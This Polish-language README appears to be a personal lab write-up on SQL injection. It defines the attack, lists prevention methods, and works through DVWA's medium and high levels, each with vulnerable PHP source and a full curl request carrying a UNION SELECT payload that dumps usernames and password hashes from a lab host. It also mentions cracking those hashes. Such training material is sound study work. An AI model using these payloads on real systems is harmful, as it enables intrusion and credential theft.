# SQLi - SQL injection
## Opis techniki
<blockquote> Atak SQL injection polega na wstawieniu lub "wstrzyknięciu" zapytania SQL za pośrednictwem danych wejściowych od klienta do aplikacji. Udany exploit SQL injection może odczytywać poufne dane z bazy danych, modyfikować dane bazy danych (wstawiać/aktualizować/usuwać), wykonywać operacje administracyjne na bazie danych (takie jak zamykanie DBMS), odzyskiwać zawartość danego pliku obecnego w systemie plików DBMS (load_file), a w niektórych przypadkach wydawać polecenia systemowi operacyjnemu.

Ataki typu SQL injection są rodzajem ataku wstrzykiwania, w którym polecenia SQL są wstrzykiwane do danych wejściowych w celu wykonania predefiniowanych poleceń SQL.

Atak ten może być również nazywany "SQLi".

 Popularne sposoby zapobiegania SQLi:
  
* Korzystanie z spreparowanych instrukcji (Prepared Statements)
* Korzystanie z prawidłowo skonstruowanych procedur przechowywanych (Stored Procedures)
* Walidacja danych wejściowych z użyciem białej listy dozwolonych wyrażeń
* Filtrowanie i stosowanie znaków ucieczki w ciągach wprowadzanych przez użytkownika 
</blockquote>

## DVWA labs

- [DVWA SQLi #1 - Medium](#dvwa-sqli-1---medium)

- [DVWA SQLi #2 - High](#dvwa-sqli-2---high)

Powtórzenie podanych przykładów wymaga zmiany adresu IP oraz tokenu sesji.

<br/>

## DVWA SQLi #1 - Medium
Cel: uzyskanie wszystkich nazw użytkowników i haseł z bazy danych.

Poziom średni wykorzystuje formę ochrony przed wstrzyknięciem SQL, z użyciem funkcji "mysql_real_escape_string()".

#### Kod źródłowy `PHP` 

```php

<?php

if( isset( $_POST[ 'Submit' ] ) ) {
    // Get input
    $id = $_POST[ 'id' ];

    $id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);

    $query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
    $result = mysqli_query($GLOBALS["___mysqli_ston"], $query) or die( '<pre>' . mysqli_error($GLOBALS["___mysqli_ston"]) . '</pre>' );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Display values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }

}

// This is used later on in the index.php page
// Setting it here so we can close the database connection in here like in the rest of the source scripts
$query  = "SELECT COUNT(*) FROM users;";
$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
$number_of_rows = mysqli_fetch_row( $result )[0];

mysqli_close($GLOBALS["___mysqli_ston"]);
```

#### Komenda `curl` 

```bash
curl -i -s -k -X $'POST' \
    -H $'Host: 10.10.97.38' -H $'Content-Length: 65' -H $'Cache-Control: max-age=0' -H $'Upgrade-Insecure-Requests: 1' -H $'Origin: http://10.10.97.38' -H $'Content-Type: application/x-www-form-urlencoded' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H $'Referer: http://10.10.97.38/vulnerabilities/sqli/' -H $'Accept-Language: en-US,en;q=0.9' -H $'Connection: close' \
    -b $'PHPSESSID=qu2dn55od2kqge7naeher9k8r6; security=medium' \
    --data-binary $'id=1 or 1=1 UNION SELECT user, password FROM users#&Submit=Submit' \
    $'http://10.10.97.38/vulnerabilities/sqli/' -o output_SQLi_medium.txt
```

#### Efekt działania skryptu:
![image](https://github.com/Jswierczynsk/sandbox/assets/133172137/42f23478-e605-4241-8c32-896ebf9fd264)

Otrzymane hashe można przyporządkować do konkretnych haseł z użyciem bruteforce bądź tablic tęczowych.
<br/>

<br/>
<br/>

## DVWA SQLi #2 - High

Cel: uzyskanie wszystkich nazw użytkowników i haseł z bazy danych.

Wartości wejściowe są przesyłane do podatnego zapytania za pośrednictwem zmiennych sesji przy użyciu osobnej strony.

#### Kod źródłowy `PHP` 

```php
<?php

if( isset( $_SESSION [ 'id' ] ) ) {
    // Get input
    $id = $_SESSION[ 'id' ];

    // Check database
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
    $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '<pre>Something went wrong.</pre>' );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Get values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);        
}

?>
```

#### Komenda `curl` 

```bash
curl -i -s -k -X $'POST' \
    -H $'Host: 10.10.97.38' -H $'Content-Length: 19' -H $'Cache-Control: max-age=0' -H $'Upgrade-Insecure-Requests: 1' -H $'Origin: http://10.10.97.38' -H $'Content-Type: application/x-www-form-urlencoded' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H $'Referer: http://10.10.97.38/vulnerabilities/sqli/session-input.php' -H $'Accept-Language: en-US,en;q=0.9' -H $'Connection: close' \
    -b $'PHPSESSID=qu2dn55od2kqge7naeher9k8r6; security=high' \
    --data-binary $'id=1\' UNION SELECT user, password FROM users#&Submit=Submit' \
    $'http://10.10.97.38/vulnerabilities/sqli/session-input.php' -o output_SQLi_high.txt
```

#### Efekt działania skryptu:
![image](https://github.com/Jswierczynsk/sandbox/assets/133172137/fbbebc42-f1ef-43c5-885f-3330dc2bc6a6)

Otrzymane hashe można przyporządkować do konkretnych haseł z użyciem bruteforce bądź tablic tęczowych.

<br/>
